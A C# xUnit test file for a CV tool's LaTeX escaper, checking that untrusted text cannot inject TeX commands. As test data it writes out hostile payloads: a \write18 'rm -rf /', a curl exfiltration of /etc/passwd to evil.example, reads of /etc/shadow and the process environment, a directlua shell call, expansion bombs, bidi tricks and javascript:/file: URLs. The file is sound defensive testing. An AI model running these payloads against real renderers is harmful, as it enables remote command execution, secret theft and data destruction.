using CvMaker.Core.Latex;
using Xunit;

namespace CvMaker.Tests;

/// <summary>
/// The injection corpus. Job postings and profile text are attacker-controlled
/// input that ends up inside a TeX compiler, so these are not style tests —
/// each one corresponds to a way the renderer could be turned into a shell, a
/// file-disclosure primitive, or a denial of service.
/// </summary>
public class LatexEscaperTests
{
    // ── The escaping contract ────────────────────────────────────────────────

    /// <summary>
    /// The single-pass property. A chained-Replace implementation escapes the
    /// braces it just emitted and produces
    /// <c>\textbackslash\{\}</c> — corrupt output that still compiles, which is
    /// the worst kind of wrong. Ordered the other way round, it is a bypass.
    /// </summary>
    [Fact]
    public void Backslash_becomes_exactly_one_textbackslash()
    {
        Assert.Equal(@"\textbackslash{}", LatexEscaper.EscapeInline(@"\"));
    }

    [Theory]
    [InlineData("{", @"\{")]
    [InlineData("}", @"\}")]
    [InlineData("$", @"\$")]
    [InlineData("&", @"\&")]
    [InlineData("#", @"\#")]
    [InlineData("_", @"\_")]
    [InlineData("%", @"\%")]
    [InlineData("~", @"\textasciitilde{}")]
    [InlineData("^", @"\textasciicircum{}")]
    [InlineData("<", @"\textless{}")]
    [InlineData(">", @"\textgreater{}")]
    [InlineData("|", @"\textbar{}")]
    public void Every_tex_metacharacter_is_escaped(string input, string expected)
    {
        Assert.Equal(expected, LatexEscaper.EscapeInline(input));
    }

    [Fact]
    public void Ordinary_text_passes_through_untouched()
    {
        const string cv = "Senior Software Engineer, payments platform (2019-2024)";
        Assert.Equal(cv, LatexEscaper.EscapeInline(cv));
    }

    [Fact]
    public void Accented_and_non_latin_text_survives()
    {
        const string name = "Konrad Cinkusz — Zürich, Kraków, 日本語";
        Assert.Equal(name, LatexEscaper.EscapeInline(name));
    }

    // ── Command execution and file disclosure ────────────────────────────────

    [Theory]
    [InlineData(@"\write18{rm -rf /}")]
    [InlineData(@"\immediate\write18{curl evil.example/$(cat /etc/passwd)}")]
    [InlineData(@"\input{/etc/passwd}")]
    [InlineData(@"\include{/proc/self/environ}")]
    [InlineData(@"\openin1=/etc/shadow")]
    [InlineData(@"\catcode`\@=11 \@@input /etc/passwd")]
    [InlineData(@"\directlua{os.execute('id')}")]
    [InlineData(@"\csname write18\endcsname{id}")]
    public void Command_injection_payloads_produce_no_control_sequence(string payload)
    {
        var escaped = LatexEscaper.EscapeInline(payload);

        AssertOnlyKnownEscapes(escaped);
        // The backslash that would have started the command is now text.
        Assert.DoesNotContain(@"\write18", escaped, StringComparison.Ordinal);
        Assert.DoesNotContain(@"\input{", escaped, StringComparison.Ordinal);
        Assert.DoesNotContain(@"\directlua", escaped, StringComparison.Ordinal);
    }

    /// <summary>
    /// An unescaped '%' comments out the rest of the line — including the
    /// template's own closing brace, which turns a text slot into a way to
    /// rewrite the document that follows it.
    /// </summary>
    [Fact]
    public void Percent_cannot_comment_out_the_rest_of_the_template()
    {
        var escaped = LatexEscaper.EscapeInline(@"Cost reduction 40% } \write18{id} %");

        Assert.DoesNotContain(@"\write18{id}", escaped, StringComparison.Ordinal);
        AssertOnlyKnownEscapes(escaped);
    }

    /// <summary>Expansion bombs: cheap to write, and they burn the render timeout.</summary>
    [Theory]
    [InlineData(@"\def\x{\x}\x")]
    [InlineData(@"\loop\iftrue\repeat")]
    [InlineData(@"\romannumeral\number\numexpr 1*10000000\relax")]
    public void Expansion_bombs_are_defused(string payload)
    {
        AssertOnlyKnownEscapes(LatexEscaper.EscapeInline(payload));
    }

    // ── Invisible characters ─────────────────────────────────────────────────

    /// <summary>
    /// Trojan Source, aimed at a hiring pipeline. A bidi override makes the
    /// rendered PDF show one employer while the extractable text — the part an
    /// ATS reads — says another. Invisible to human review, so it is removed
    /// rather than escaped.
    /// </summary>
    [Theory]
    [InlineData("\u202E")] // RIGHT-TO-LEFT OVERRIDE
    [InlineData("\u202D")] // LEFT-TO-RIGHT OVERRIDE
    [InlineData("\u2066")] // LEFT-TO-RIGHT ISOLATE
    [InlineData("\u200B")] // ZERO WIDTH SPACE
    [InlineData("\u200E")] // LEFT-TO-RIGHT MARK
    [InlineData("\uFEFF")] // ZERO WIDTH NO-BREAK SPACE
    [InlineData("\u00AD")] // SOFT HYPHEN
    public void Invisible_and_bidi_characters_are_stripped(string invisible)
    {
        var escaped = LatexEscaper.EscapeInline($"Acme{invisible} Corp");

        Assert.DoesNotContain(invisible, escaped, StringComparison.Ordinal);
        Assert.Equal("Acme Corp", escaped);
    }

    [Fact]
    public void Control_characters_are_stripped()
    {
        var escaped = LatexEscaper.EscapeInline("Engineer \u001B[31m\u0007");

        Assert.False(escaped.Contains('\u001B'), "ESC survived");
        Assert.False(escaped.Contains('\u0007'), "BEL survived");
        Assert.Equal("Engineer [31m", escaped);
    }

    // ── Whitespace policy ────────────────────────────────────────────────────

    /// <summary>
    /// A blank line is <c>\par</c>, which is a syntax error inside most macro
    /// arguments. Inline slots are macro arguments.
    /// </summary>
    [Fact]
    public void Inline_slots_collapse_newlines_to_spaces()
    {
        Assert.Equal("Acme Corp Berlin", LatexEscaper.EscapeInline("Acme Corp\n\n\nBerlin"));
    }

    [Fact]
    public void Inline_slots_collapse_whitespace_runs_and_trim()
    {
        Assert.Equal("Acme Corp", LatexEscaper.EscapeInline("   Acme \t  Corp   "));
    }

    [Fact]
    public void Paragraph_slots_preserve_blank_lines_as_par()
    {
        var escaped = LatexEscaper.EscapeParagraphs("First para.\n\nSecond para.");

        Assert.Contains(@"\par", escaped, StringComparison.Ordinal);
        Assert.Contains("First para.", escaped, StringComparison.Ordinal);
        Assert.Contains("Second para.", escaped, StringComparison.Ordinal);
    }

    [Fact]
    public void Paragraph_slots_still_escape_metacharacters()
    {
        var escaped = LatexEscaper.EscapeParagraphs(@"Saved 40% \write18{id}");

        Assert.DoesNotContain(@"\write18", escaped, StringComparison.Ordinal);
        AssertOnlyKnownEscapes(escaped, alsoAllow: [@"\par"]);
    }

    // ── Length caps ──────────────────────────────────────────────────────────

    [Fact]
    public void Slots_are_length_capped()
    {
        var escaped = LatexEscaper.EscapeInline(new string('a', 5_000), maxLength: 100);
        Assert.Equal(100, escaped.Length);
    }

    /// <summary>
    /// Truncating mid-surrogate-pair yields an unpaired code unit, which
    /// becomes a replacement glyph in the PDF or an encoding error in the
    /// engine. Emoji in CV bullets are common enough for this to matter.
    /// </summary>
    [Fact]
    public void Truncation_does_not_split_a_surrogate_pair()
    {
        var input = string.Concat(Enumerable.Repeat("👍", 50));

        var escaped = LatexEscaper.EscapeInline(input, maxLength: 11);

        Assert.True(escaped.Length % 2 == 0, "cut mid-surrogate-pair");
        foreach (var rune in escaped.EnumerateRunes())
        {
            Assert.NotEqual(0xFFFD, rune.Value);
        }
    }

    [Fact]
    public void Null_and_empty_are_empty()
    {
        Assert.Equal(string.Empty, LatexEscaper.EscapeInline(null));
        Assert.Equal(string.Empty, LatexEscaper.EscapeInline(""));
        Assert.Equal(string.Empty, LatexEscaper.EscapeParagraphs(null));
    }

    // ── URLs ─────────────────────────────────────────────────────────────────

    /// <summary>
    /// A CV is full of user-supplied links and PDF viewers follow them. The
    /// scheme allowlist lives in the escaper so no template author has to
    /// remember it.
    /// </summary>
    [Theory]
    [InlineData("javascript:alert(1)")]
    [InlineData("file:///etc/passwd")]
    [InlineData("data:text/html;base64,PHNjcmlwdD4=")]
    [InlineData("not a url at all")]
    [InlineData("")]
    public void Dangerous_url_schemes_are_rejected(string url)
    {
        Assert.Null(LatexEscaper.EscapeUrl(url));
    }

    [Theory]
    [InlineData("https://github.com/konradcinkusz")]
    [InlineData("http://example.com/cv")]
    [InlineData("mailto:someone@example.com")]
    public void Safe_url_schemes_are_accepted(string url)
    {
        Assert.NotNull(LatexEscaper.EscapeUrl(url));
    }

    [Fact]
    public void Url_metacharacters_are_escaped()
    {
        var escaped = LatexEscaper.EscapeUrl("https://example.com/a%20b#frag_ment");

        Assert.NotNull(escaped);
        Assert.Contains(@"\%", escaped!, StringComparison.Ordinal);
        Assert.Contains(@"\#", escaped!, StringComparison.Ordinal);
        Assert.Contains(@"\_", escaped!, StringComparison.Ordinal);

        // The invariant is "no '%' starts a comment", not "the text %2 never
        // appears" — a percent-encoded URL escapes to \%20, which contains %2
        // perfectly legitimately. Assert on the character before each '%'.
        for (var i = 0; i < escaped!.Length; i++)
        {
            if (escaped[i] == '%')
            {
                Assert.True(i > 0 && escaped[i - 1] == '\\',
                    $"unescaped '%' at index {i} would comment out the rest of the line");
            }
        }
    }

    // ── Helper ───────────────────────────────────────────────────────────────

    /// <summary>
    /// The strong property: every backslash in the output starts a sequence
    /// this escaper deliberately emitted. Anything else means input reached the
    /// engine as a command.
    /// </summary>
    private static void AssertOnlyKnownEscapes(string escaped, string[]? alsoAllow = null)
    {
        string[] known =
        [
            @"\textbackslash{}", @"\textasciitilde{}", @"\textasciicircum{}",
            @"\textless{}", @"\textgreater{}", @"\textbar{}",
            @"\{", @"\}", @"\$", @"\&", @"\#", @"\_", @"\%",
            .. (alsoAllow ?? Array.Empty<string>())
        ];

        var i = 0;
        while (i < escaped.Length)
        {
            if (escaped[i] != '\\') { i++; continue; }

            var match = known.FirstOrDefault(k =>
                escaped.AsSpan(i).StartsWith(k, StringComparison.Ordinal));

            Assert.True(
                match is not null,
                $"Unescaped control sequence at index {i}: " +
                $"'{escaped[i..Math.Min(escaped.Length, i + 24)]}'");

            i += match!.Length;
        }
    }
}
